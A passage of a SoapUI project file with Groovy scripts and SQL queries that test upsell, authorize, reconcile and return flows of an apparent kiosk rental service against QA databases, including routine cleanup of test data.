PASS</con:value></con:property><con:property><con:name>ScenarioNo</con:name><con:value>73</con:value></con:property><con:property><con:name>StartTime</con:name><con:value>12/26/18-14:24:42.935</con:value></con:property><con:property><con:name>EndTime</con:name><con:value>12/26/18-14:26:11.822</con:value></con:property><con:property><con:name>ServiceFeeAmount</con:name><con:value>0.0900</con:value></con:property><con:property><con:name>ReferenceNumber</con:name><con:value>5648637</con:value></con:property><con:property><con:name>AccountNumber</con:name><con:value>81483122978646</con:value></con:property><con:property><con:name>ScenarioCount</con:name><con:value>24</con:value></con:property></con:properties><con:reportParameters/><con:breakPoints><con:testStepId>6873cb8c-7751-4904-9fc0-ed152c6ef0c6</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>d498c61d-c9fd-48e5-baf1-1503a4a1b824</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>275f8372-53c8-49f3-807b-3f64816f3d89</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>3b329060-a4aa-4532-9611-e37bcd9a11c3</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>f9658b22-7814-4f47-af67-f42efbd6c101</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>ef30018b-951d-43d4-95b1-5f1c3248c5b1</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>b3b7c784-7c50-42e4-b75d-8e6f746e026c</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>347bcb1b-704d-4b55-82ea-8c570a159ab9</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>09eaa7a0-2291-4d7a-84cd-5c6da1e51274</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>d7e65004-1953-419d-8f1a-edeba3ca5d9c</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>3e9ab344-53e3-4d68-9b28-70629d9934e8</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints></con:testCase><con:testCase id="04144493-9b2b-4665-90a8-5ad3a5c68e34" discardOkResults="true" failOnError="true" failTestCaseOnErrors="true" keepSession="false" name="Upsell" searchProperties="true" timeout="0" wsrmEnabled="false" wsrmVersion="1.0" wsrmAckTo="" amfAuthorisation="false" amfEndpoint="" amfLogin="" amfPassword="" maxResults="0"><con:settings><con:setting id="IncludeOverview">true</con:setting><con:setting id="IncludeResults">true</con:setting><con:setting id="FlowLayout">false</con:setting><con:setting id="ErrorDetails">true</con:setting><con:setting id="IncludeCoverage">true</con:setting></con:settings><con:testStep type="jdbc" name="WarmUp Script" id="67673e30-ea3e-4f22-a58f-a7e5e8e1fd3e"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>RedboxServerDB</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=RedboxServerDB;integratedSecurity=true;</con:connectionString><con:password>t</con:password><con:connectionProperties/><con:query>Select GetDate() AS CurrentDateTime</con:query><con:properties/></con:config></con:testStep><con:testStep type="datasource" name="DataSource" id="d197a29c-d5ea-4045-a2e0-0f594ec71806"><con:settings><con:setting id="com.eviware.soapui.impl.wsdl.teststeps.datasource.DataSourceContainer@prepared-properties">&lt;xml-fragment/></con:setting></con:settings><con:config xsi:type="con:DataSourceStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dataSource type="JDBC"><con:configuration><driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</driver><connstr>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=QaAutomation;integratedSecurity=true;</connstr><pass>t</pass><Connection>QaAutomation( QAInt )</Connection><query>Select 
	KS_Upsell.ID As ID, 
	KS_Upsell.Scenario As Scenario, 
	KS_Upsell.Email As Email, 
	KS_Upsell.CreditCardNumber As Ccnumber, 
	KS_Upsell.CreditCardType As CCType, 
	KS_Upsell.PromoCode As PromoCode, 
	KS_Upsell.PromoValue As PromoValue,
	KS_Upsell.KioskID As KioskID, 
	KS_Upsell.RentalFormats As rentalFormats,
	KS_Upsell.NumberOfRentals As numOfRentals,
	KS_Upsell.RentalVendStatus As RentalVendStatus,
	KS_Upsell.PurchaseFormats As PurchaseFormats,
	KS_Upsell.NumberOfPurchases As numOfPurchases,
	KS_Upsell.PurchaseVendStatus As PurchaseVendStatus, 
	KS_Upsell.SetDaysBack As SetDaysBack, 
	KS_Upsell.IsOffline As IsOffline, 
	KS_Upsell.LoyaltyFlag As LoyaltyFlag,
	KS_Upsell.UpsellOffer As UpsellOffer, 
	KS_Upsell.UpsellOfferStatus As UpsellOfferStatus
From KS_Upsell
Where ID not in (38,39,83)</query><fetchSize/><stored-procedure>false</stored-procedure></con:configuration></con:dataSource><con:property>ID</con:property><con:property>Scenario</con:property><con:property>Email</con:property><con:property>Ccnumber</con:property><con:property>CCType</con:property><con:property>PromoCode</con:property><con:property>PromoValue</con:property><con:property>KioskID</con:property><con:property>rentalFormats</con:property><con:property>numOfRentals</con:property><con:property>RentalVendStatus</con:property><con:property>PurchaseFormats</con:property><con:property>numOfPurchases</con:property><con:property>PurchaseVendStatus</con:property><con:property>SetDaysBack</con:property><con:property>IsOffline</con:property><con:property>LoyaltyFlag</con:property><con:property>UpsellOffer</con:property><con:property>UpsellOfferStatus</con:property><con:completeLastOperation>true</con:completeLastOperation><con:restartOnRun>true</con:restartOnRun></con:config></con:testStep><con:testStep type="groovy" name="Get Data" id="405ca190-d81d-4849-9a91-3c3e1191afad"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status
def ScenarioNo =  context.expand( '${DataSource#ID}' );
testRunner.testCase.setPropertyValue("ScenarioNo", ScenarioNo.toString())
log.info ("--------------------------------" + context.testCase.name + "-------------------------------");
log.info ("Scenario No: $ScenarioNo");
log.info ("Scenario:Kiosk " + context.expand( '${DataSource#Scenario}' ));
log.info ("------------------------------START----------------------------------");

//Get Data from Data Source
def ccNumber = context.expand( '${DataSource#Ccnumber}' );
def kioskID = context.expand( '${DataSource#KioskID}' );
def UseCredits = '0'; //Default to ); since credits will be disabled after Loyality is ON
def IsOffline = context.expand( '${DataSource#IsOffline}' );

//Get Encrypted CC Info using Merchant Service method.
def encryptCC = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Generate Encrypted CCInfo"];
encryptCC.setPropertyValue("CardNumber", ccNumber);
encryptCC.setPropertyValue("KeyID", context.expand( '${#Project#KeyId}' ));

def ccrunner = encryptCC.run( null, false );	
// show that it worked out ok
log.info("Status: $ccrunner.status, time taken for TestCase was: $ccrunner.timeTaken ms");
// assert that it didn't fail
assert ccrunner.status != Status.FAILED : ccrunner.reason

//Define the Db Connection
import groovy.sql.*;
// Below line will create an object of the already created JDBC connection.
def ConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('RedboxServerDB');
def constring = ConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(constring);

//Get TaxRate for the Kiosk.
def taxDetails = sql.firstRow("Select Sales_Tax_Rate, PurchaseTaxRate, DigitalPurchaseTaxRate, ServiceFeeTaxRate,ServiceFee  from KioskClient Where KioskClient_Id = $kioskID");
def rentalTaxRate = (taxDetails.Sales_Tax_Rate);
def purchaseTaxRate = (taxDetails.PurchaseTaxRate);
def digitalPurchaseTaxRate = (taxDetails.DigitalPurchaseTaxRate);
def serviceFeeTaxRate = (taxDetails.ServiceFeeTaxRate)!= null ? (taxDetails.ServiceFeeTaxRate) : "0.0000";
def serviceFeeAmount = (taxDetails.ServiceFee)!= null ? (taxDetails.ServiceFee) : "0.0000";

log.info ("KioskID:$kioskID; RentalTaxRate:$rentalTaxRate; PurchaseTaxRate:$purchaseTaxRate; DigitalPurchaseTaxRate:$digitalPurchaseTaxRate; ServiceFeeTaxRate:$serviceFeeTaxRate");
//Save Tax Rate at property level
testRunner.testCase.setPropertyValue('RentalTaxRate',rentalTaxRate.toString());
testRunner.testCase.setPropertyValue('PurchaseTaxRate',purchaseTaxRate.toString());
testRunner.testCase.setPropertyValue('DigitalPurchaseTaxRate',digitalPurchaseTaxRate.toString());
testRunner.testCase.setPropertyValue('ServiceFeeTaxRate',serviceFeeTaxRate.toString());
testRunner.testCase.setPropertyValue('ServiceFeeAmount',serviceFeeAmount.toString());

def getCP = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Get Customer Info From Encrypted CC"];
getCP.setPropertyValue("CardHashId",encryptCC.getPropertyValue("CardID"));
def getCPrunner = getCP.run( null, false );	
// show that it worked out ok
log.info("Status: $getCPrunner.status, time taken for TestCase was: $getCPrunner.timeTaken ms");
// assert that it didn't fail
assert getCPrunner.status != Status.FAILED : getCPrunner.reason

//Get CustomerProfileNumber
def CustomerProfileNumber = getCP.getPropertyValue("CpCustomerNumber");
testRunner.testCase.setPropertyValue("CustomerProfileNumber",CustomerProfileNumber);
def CustomerID = getCP.getPropertyValue("CustomerId");
//Deleting the records from CustomerDisc to avoid below error
//Found an existing CustomerDisc record for disc: XXXXX, matching customer: XXXXXX!  Echo message, rolling back reconcile
log.info("Number of customerdisc records deleted: " + sql.executeUpdate("DELETE FROM CustomerDisc WHERE CustomerId in ($CustomerID)"));

//Clear Open Rental and Reservations
def runCleanCustomer = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Cleanup Open Transactions"];
runCleanCustomer.setPropertyValue("CustomerId",CustomerID);
runCleanCustomer.setPropertyValue("kioskID",kioskID);
def CleanCustomerrunner = runCleanCustomer.run( null, false );	
// show that it worked out ok
log.info("Status: $CleanCustomerrunner.status, time taken for TestCase [Cleanup Open Transactions] was: $CleanCustomerrunner.timeTaken ms");
// assert that it didn't fail
assert CleanCustomerrunner.status != Status.FAILED : CleanCustomerrunner.reason

//Create Credits.
if (CustomerProfileNumber != "" &amp;&amp; UseCredits == '2' &amp;&amp; IsOffline != "true")
{
	def generateCredits = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Set Up Credits"];
	generateCredits.setPropertyValue("CpCustomerNumber",CustomerProfileNumber);
	generateCredits.setPropertyValue("DVDCreditQty",context.expand( '${DataSource#DVDCredits}' ));
	generateCredits.setPropertyValue("MovieCreditQty",context.expand( '${DataSource#MovieCredits}' ));
	generateCredits.setPropertyValue("GameCreditQty",context.expand( '${DataSource#GameCredits}' ));

	def generateCreditsrunner = generateCredits.run( null, false );	
	// show that it worked out ok
	log.info("Status: $generateCreditsrunner.status, time taken for TestCase was: $generateCreditsrunner.timeTaken ms");
	// assert that it didn't fail
	assert generateCreditsrunner.status != Status.FAILED : generateCreditsrunner.reason

	log.info ("Successfully Created Credits");
}
else
{
	log.info ("No credits required for the testCase or CustomerProfileNumber is NULL");
}</script></con:config></con:testStep><con:testStep type="groovy" name="Authorize" id="879d7925-e719-49fa-9251-74a8261a9881"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status
def tc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Authorize"];
//Cleaning up the properties; set the values to NULL before the start

for(int j=0;j&lt;tc.getPropertyCount();j++)
{
   tc.getPropertyAt(j).setValue("");
}

tc.setPropertyValue("Email", context.expand( '${DataSource#Email}' ));
tc.setPropertyValue("CCNumber", context.expand( '${DataSource#Ccnumber}' ));
tc.setPropertyValue("CCType", context.expand( '${DataSource#CCType}' ));
tc.setPropertyValue("PromoCode", context.expand( '${DataSource#PromoCode}' ));
tc.setPropertyValue("PromoValue", context.expand( '${DataSource#PromoValue}' ));
tc.setPropertyValue("KioskID", context.expand( '${DataSource#KioskID}' ));
tc.setPropertyValue("rentalFormats", context.expand( '${DataSource#rentalFormats}' ));
tc.setPropertyValue("numOfRentals", context.expand( '${DataSource#numOfRentals}' ));
tc.setPropertyValue("PurchaseFormats", context.expand( '${DataSource#PurchaseFormats}' ));
tc.setPropertyValue("numOfPurchases", context.expand( '${DataSource#numOfPurchases}' ));
tc.setPropertyValue("SetDaysBack", context.expand( '${DataSource#SetDaysBack}' ));
tc.setPropertyValue("LoyaltyFlag", context.expand( '${DataSource#LoyaltyFlag}' ));
tc.setPropertyValue("UseCredits", '0');//HardCoded to 0 since it there will be no credits in future
tc.setPropertyValue("IsOffline", context.expand( '${DataSource#IsOffline}' ));
tc.setPropertyValue("RentalTaxRate", context.expand( '${#TestCase#RentalTaxRate}' ));
tc.setPropertyValue("PurchaseTaxRate", context.expand( '${#TestCase#PurchaseTaxRate}' ));
tc.setPropertyValue("DigitalPurchaseTaxRate", context.expand( '${#TestCase#DigitalPurchaseTaxRate}' ));
tc.setPropertyValue("CustomerProfileNumber", context.expand( '${#TestCase#CustomerProfileNumber}' ));
tc.setPropertyValue("EnableServiceFee", "false");
tc.setPropertyValue("ServiceFeeTaxRate", context.expand( '${#TestCase#ServiceFeeTaxRate}' ));
tc.setPropertyValue("ServiceFeeAmount", context.expand( '${#TestCase#ServiceFeeAmount}' ));
tc.setPropertyValue("HasUpsell", "true");
tc.setPropertyValue("UpsellOffer", context.expand( '${DataSource#UpsellOffer}' ));
tc.setPropertyValue("UpsellOfferStatus", context.expand( '${DataSource#UpsellOfferStatus}' ));
tc.setPropertyValue("HasOffer", "false");
tc.setPropertyValue("MDVFlag", '');
tc.setPropertyValue("MDVDiscNumber",'');

//Check how to get the disc price

def runner = tc.run( null, false );
// show that it worked out ok
log.info("Status: $runner.status, time taken for TestCase [Authorize] was: $runner.timeTaken ms");
def tcStatus = (runner.status).toString()
if(tcStatus == "FAIL")
{
	assert runner.status == Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","Authorize $tcStatus");
	testRunner.gotoStepByName("SaveResults"); //No need to run the next steps.
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}
else
{
	// assert that it didn't fail
	assert runner.status != Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","Authorize $tcStatus");
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}</script></con:config></con:testStep><con:testStep type="groovy" name="Reconcile" id="03a0cd05-cd65-48b9-a044-67dcec957297"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status

def isOffline = context.expand( '${DataSource#IsOffline}' );
//Set properties from Data Source
def tc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Reconcile"];
//Cleaning up the properties; set the values to NULL before the start
for(int j=0;j&lt;tc.getPropertyCount();j++)
{
   tc.getPropertyAt(j).setValue("");
}
tc.setPropertyValue("Email", context.expand( '${DataSource#Email}' ));
tc.setPropertyValue("KioskID", context.expand( '${DataSource#KioskID}' ));
tc.setPropertyValue("UseCredits", '0');
tc.setPropertyValue("RentalTaxRate", context.expand( '${#TestCase#RentalTaxRate}' ));
tc.setPropertyValue("PurchaseTaxRate", context.expand( '${#TestCase#PurchaseTaxRate}' ));
tc.setPropertyValue("DigitalPurchaseTaxRate", context.expand( '${#TestCase#DigitalPurchaseTaxRate}' ));
tc.setPropertyValue("RentalVendStatus", context.expand( '${DataSource#RentalVendStatus}' ));
tc.setPropertyValue("PurchaseVendStatus", context.expand( '${DataSource#PurchaseVendStatus}' ));
tc.setPropertyValue("IsOffline", context.expand( '${DataSource#IsOffline}' ));

//Get properties from Authorize test case from test suite Generic Steps (KioskService).
def authtc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Authorize"];
tc.setPropertyValue("PurchaseCount", authtc.getPropertyValue("PurchaseCount"));
tc.setPropertyValue("PurchaseBarcodes", authtc.getPropertyValue("PurchaseBarcodes"));
tc.setPropertyValue("PurchaseTitleIds", authtc.getPropertyValue("PurchaseTitleIds"));
tc.setPropertyValue("PurchaseProductFamily", authtc.getPropertyValue("PurchaseProductFamily"));
tc.setPropertyValue("PurchaseProductType", authtc.getPropertyValue("PurchaseProductType"));
tc.setPropertyValue("PurchaseDiscPrice", authtc.getPropertyValue("PurchaseDiscPrice"));
tc.setPropertyValue("RentalCount", authtc.getPropertyValue("RentalCount"));
tc.setPropertyValue("RentalBarcodes", authtc.getPropertyValue("RentalBarcodes"));
tc.setPropertyValue("RentalTitleIds", authtc.getPropertyValue("RentalTitleIds"));
tc.setPropertyValue("RentalProductFamily", authtc.getPropertyValue("RentalProductFamily"));
tc.setPropertyValue("RentalProductType", authtc.getPropertyValue("RentalProductType"));
tc.setPropertyValue("RentalDiscPrice", authtc.getPropertyValue("RentalDiscPrice"));
tc.setPropertyValue("RentalNonReturnPrice", authtc.getPropertyValue("RentalNonReturnPrice"));
tc.setPropertyValue("RentalNonReturnDays", authtc.getPropertyValue("RentalNonReturnDays"));
tc.setPropertyValue("HasPhysicalPurchase", authtc.getPropertyValue("HasPhysicalPurchase"));
tc.setPropertyValue("DiscountPayload", authtc.getPropertyValue("DiscountPayload"));
tc.setPropertyValue("CCPayload", authtc.getPropertyValue("CCPayload"));
tc.setPropertyValue("PromoCode", authtc.getPropertyValue("PromoCode"));
tc.setPropertyValue("PromoValue", authtc.getPropertyValue("PromoValue"));
tc.setPropertyValue("CustomerProfileNumber", authtc.getPropertyValue("CustomerProfileNumber"));
tc.setPropertyValue("EstimatedLoyaltyAmount", authtc.getPropertyValue("EstimatedLoyaltyAmount"));
tc.setPropertyValue("HasLoyaltyDiscount", authtc.getPropertyValue("HasLoyaltyDiscount"));
tc.setPropertyValue("HasPromoDiscount", authtc.getPropertyValue("HasPromoDiscount"));
tc.setPropertyValue("DiscountAmountList", authtc.getPropertyValue("DiscountAmountList"));
tc.setPropertyValue("EnableServiceFee", authtc.getPropertyValue("EnableServiceFee"));
tc.setPropertyValue("HasUpsell",authtc.getPropertyValue("HasUpsell"));
tc.setPropertyValue("ServiceFeePayload", authtc.getPropertyValue("ServiceFeePayload"));
tc.setPropertyValue("UpsellOffer", authtc.getPropertyValue("UpsellOffer"));
tc.setPropertyValue("UpsellOfferStatus", authtc.getPropertyValue("UpsellOfferStatus"));
tc.setPropertyValue("UpsellTypeId", authtc.getPropertyValue("UpsellTypeId"));
tc.setPropertyValue("ProductGroupId", authtc.getPropertyValue("ProductGroupId"));
tc.setPropertyValue("RCFlag", authtc.getPropertyValue("RCFlag"));
tc.setPropertyValue("rentalRCFlag", authtc.getPropertyValue("rentalRCFlag"));
tc.setPropertyValue("purchaseRCFlag", authtc.getPropertyValue("purchaseRCFlag"));
//MDV
tc.setPropertyValue("RentalMDVFlag", authtc.getPropertyValue("RentalMDVFlag"));
tc.setPropertyValue("RentalMDVDiscNumber", authtc.getPropertyValue("RentalMDVDiscNumber"));
tc.setPropertyValue("PurchaseMDVFlag", authtc.getPropertyValue("PurchaseMDVFlag"));
tc.setPropertyValue("PurchaseMDVDiscNumber", authtc.getPropertyValue("PurchaseMDVDiscNumber"));

if (isOffline == 'true')
{
	//For Offline set the values to NULL
	tc.setPropertyValue("TransactionID", "null");
	tc.setPropertyValue("InvoiceID", "");
}
else
{
	tc.setPropertyValue("TransactionID", authtc.getPropertyValue("TransactionID"));
	tc.setPropertyValue("InvoiceID", authtc.getPropertyValue("InvoiceID"));
}

//tc.setPropertyValue("IsOffline", "false"); //hardCoded for time being.

def runner = tc.run( null, false );
// show that it worked out ok
log.info("Status: $runner.status, time taken for TestCase [Reconcile] was: $runner.timeTaken ms");
def tcStatus = (runner.status).toString()
if(tcStatus == "FAIL")
{
	assert runner.status == Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","Reconcile $tcStatus");
	testRunner.gotoStepByName("SaveResults"); //No need to run the next steps.
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}
else
{
	// assert that it didn't fail
	assert runner.status != Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","Reconcile $tcStatus");
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}</script></con:config></con:testStep><con:testStep type="groovy" name="Return" id="4008f8da-b53b-4684-812b-8fb2a463c47f"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status
//get the Return Test case
def tc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Return"];
def reconciletc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Reconcile"];
//Cleaning up the properties; set the values to NULL before the start
for(int j=0;j&lt;tc.getPropertyCount();j++)
{
   tc.getPropertyAt(j).setValue("");
}
def vendedBarcodes = reconciletc.getPropertyValue("VendedRentalBarcodes");
def TransactionID = reconciletc.getPropertyValue("TransactionID");
def CardType = reconciletc.getPropertyValue("CardType");
def InvoiceID = reconciletc.getPropertyValue("InvoiceID");
def IsOffline = reconciletc.getPropertyValue("IsOffline");
def RentalCount = reconciletc.getPropertyValue("VendedRentalsCount");
def PurchaseCount = reconciletc.getPropertyValue("VendedPurchaseCount");
def setDaysBack = Eval.me("[" + context.expand('${DataSource#SetDaysBack}') + "]");
def customerProfileNumber = context.expand( '${#TestCase#CustomerProfileNumber}' );
log.info ("setDaysBack:$setDaysBack; vendedBarcodes:$vendedBarcodes");
vendedBarcodesList = vendedBarcodes.split(",");
//Added this logic to avoid bad data in datasource; test case failure due to bad data
if (vendedBarcodesList.size() != setDaysBack.size())
{
	def difference = (vendedBarcodesList.size() - setDaysBack.size())
     for (i = 0; i &lt; difference; i++)
     {
     	setDaysBack.add('0') //if the size is different add the default to 0
     }
}
else
{
     //nothing to do, code/data looks good
}
def setDaysBackList = setDaysBack.toString().replaceAll("\\[","").replaceAll("\\]","").split(",");

//Get Scenario Count
testRunner.testCase.setPropertyValue("ScenarioCount", (testRunner.testCase.getPropertyValue("ScenarioCount").toShort() + 1 ).toString());
testRunner.testCase.testSuite.project.testSuites[testRunner.testCase.testSuite.name].setPropertyValue("TotalScenarioCount", (testRunner.testCase.testSuite.project.testSuites[testRunner.testCase.testSuite.name].getPropertyValue("TotalScenarioCount").toShort() + 1 ).toString())

//Call Return Step in for loop based on number of barcodes.
if (vendedBarcodes == "")
{
	log.info ("No Return is required");
	testRunner.gotoStepByName("DataSource Loop");
}
else
{
	for (r = 0; r &lt; vendedBarcodesList.size(); r++)
	{				
		curvendedBarcodes = vendedBarcodesList[r].toString().trim();
		cursetDaysBack = setDaysBackList[r].toString().trim()
		log.info ("SetDaysBack:$cursetDaysBack ;Barcode:$curvendedBarcodes");
		tc.setPropertyValue("Barcode", curvendedBarcodes);
		tc.setPropertyValue("SetDaysBack", cursetDaysBack);
		tc.setPropertyValue("KioskID", context.expand( '${DataSource#KioskID}' ));
		tc.setPropertyValue("TransactionID", TransactionID);
		tc.setPropertyValue("ReturnType", '6' );
		tc.setPropertyValue("FailedSecurityRead", 'False' );
		tc.setPropertyValue("CustomerProfileNumber", customerProfileNumber );
		tc.setPropertyValue("CardType", CardType);
		tc.setPropertyValue("InvoiceID", InvoiceID);
		tc.setPropertyValue("IsOffline", IsOffline);
		tc.setPropertyValue("RentalCount", RentalCount);
		tc.setPropertyValue("PurchaseCount", PurchaseCount);
	
		def runner = tc.run( null, false );
		// show that it worked out ok
		log.info("Status: $runner.status, time taken for TestCase [Return] was: $runner.timeTaken ms");
		def tcStatus = (runner.status).toString()
	//	assert runner.status != Status.FAILED : runner.reason
	
		if(tcStatus == "FAIL")
		{
			assert runner.status == Status.FAILED : runner.reason
			testRunner.testCase.setPropertyValue("TestCaseStatus","Return $tcStatus");
			testRunner.gotoStepByName("SaveResults"); //No need to run the next steps.
		}
		else
		{
			// assert that it didn't fail
			assert runner.status != Status.FAILED : runner.reason
			testRunner.testCase.setPropertyValue("TestCaseStatus","Return $tcStatus");
			testRunner.gotoStepByName("DataSource Loop");
		}
	
	}
}</script></con:config></con:testStep><con:testStep type="datasink" name="SaveResults" id="34a2c605-3069-413d-9291-f78bf36ea8b4"><con:settings/><con:config xsi:type="con:DataSinkStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dataSink type="File"><con:configuration><fileName>${projectDir}/Test_Results.txt</fileName><separator>:</separator><escape>"</escape><quote>false</quote><trim>true</trim><append>false</append><encoding>Cp1252</encoding></con:configuration></con:dataSink><con:properties><con:property><con:name>Number</con:name><con:value>${#TestCase#ScenarioNo}</con:value></con:property><con:property><con:name>Scenario</con:name><con:value>${DataSource#Scenario}</con:value></con:property><con:property><con:name>TransactionId</con:name><con:value>${#TestCase#TransactionId}</con:value></con:property><con:property><con:name>Status</con:name><con:value>${#TestCase#TestCaseStatus}</con:value></con:property><con:property><con:name>Date</con:name><con:value>${=new java.text.SimpleDateFormat("MM/dd/yy-HH:mm:ss.SSS").format(new java.util.Date())}</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="datasourceloop" name="DataSource Loop" id="e3e08a79-ce31-4a80-8c33-6c36b3dfdf46"><con:settings/><con:config><dataSourceStep>DataSource</dataSourceStep><targetStep>Get Data</targetStep></con:config></con:testStep><con:setupScript>testRunner.testCase.setPropertyValue("StartTime", new java.text.SimpleDateFormat("MM/dd/yy-HH:mm:ss.SSS").format(new java.util.Date()));
log.info("/###########################START###########################/");
log.info("Test Case Name : " + context.testCase.name);
log.info("/###########################START###########################/");
//Cleanup Script
log.info("Cleaning up any open transactions from previous executions...");
import com.eviware.soapui.model.testsuite.TestRunner.Status
import groovy.json.JsonSlurper
import groovy.sql.Sql
com.eviware.soapui.support.GroovyUtils.registerJdbcDriver("com.microsoft.sqlserver.jdbc.SQLServerDriver");
def rbConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('RedboxServerDB');
def rbconstring = rbConObj.getConnectionString();
def msConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('MerchantService');
def msconstring = msConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(rbconstring);
def mssql = Sql.newInstance(msconstring);

//Disable batching job.
mssql.execute("EXEC msdb.dbo.sp_update_job @job_name='CreateBatchItemsAndBatches',@enabled = 0");
log.info ("Batch Job is disabled");

log.info("...cleaning up transactions");
sql.eachRow("SELECT t.transaction_id FROM [Transaction] t INNER JOIN disc_transaction dt ON t.transaction_id = dt.transaction_id WHERE t.customer_id in (19799,264389) AND dt.Transaction_Type = 1  AND t.Transaction_Status = 4 AND ((dt.DiscTransaction_Status = 2) OR ( dt.DiscTransaction_Status = 4 AND t.ChargeDate IS NOT NULL AND (ApprovalCode IS NULL OR ApprovalCode = '')))"){
//for each transaction id remove disc transaction, transaction and customer disc etc
	row ->
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM disc_transaction WHERE transaction_id = ${row.Transaction_Id}"))
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM unplayablereturnhistory WHERE transactionid = ${row.Transaction_Id}"))
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM [TRANSACTION] WHERE TRANSACTION_ID = ${row.Transaction_Id}"))
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM CustomerTransaction WHERE TransactionID = ${row.Transaction_Id}"))
}


log.info("...cleaning up barcodes");
//reset the disc statuses to 'in kiosk'
log.info("Number of customer disc deleted: " + sql.executeUpdate("DELETE FROM CustomerDisc WHERE CustomerId in (19799,264389)"))
//sql.executeUpdate("UPDATE disc SET physical_status = 2 Where Title_ID in (Select Title_ID from Title WHere [FormatId] = 17) and KioskClient_ID = 1505")
sql.executeUpdate("UPDATE disc SET physical_status = 2 Where KioskClient_ID = 1505");

testRunner.testCase.setPropertyValue("ScenarioCount", "0");</con:setupScript><con:tearDownScript>import groovy.json.JsonSlurper
import groovy.sql.Sql
com.eviware.soapui.support.GroovyUtils.registerJdbcDriver("com.microsoft.sqlserver.jdbc.SQLServerDriver");
def msConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('MerchantService');
def msconstring = msConObj.getConnectionString();
//Define the Connection
def mssql = Sql.newInstance(msconstring);
//Enable batching job.
mssql.execute("EXEC msdb.dbo.sp_update_job @job_name='CreateBatchItemsAndBatches',@enabled = 1");
log.info ("Batch Job is Enabled");
def scenarioCount = context.expand( '${#TestCase#ScenarioCount}' )

log.info("/###########################END###########################/");
log.info("Test Case Name : " + context.testCase.name + "Test Case Status : " + testRunner.getStatus());
log.info("Scenario Count : $scenarioCount");
log.info ("Time Taken: ${((testRunner.timeTaken)/1000)/60} mins");
log.info("/###########################END###########################/");
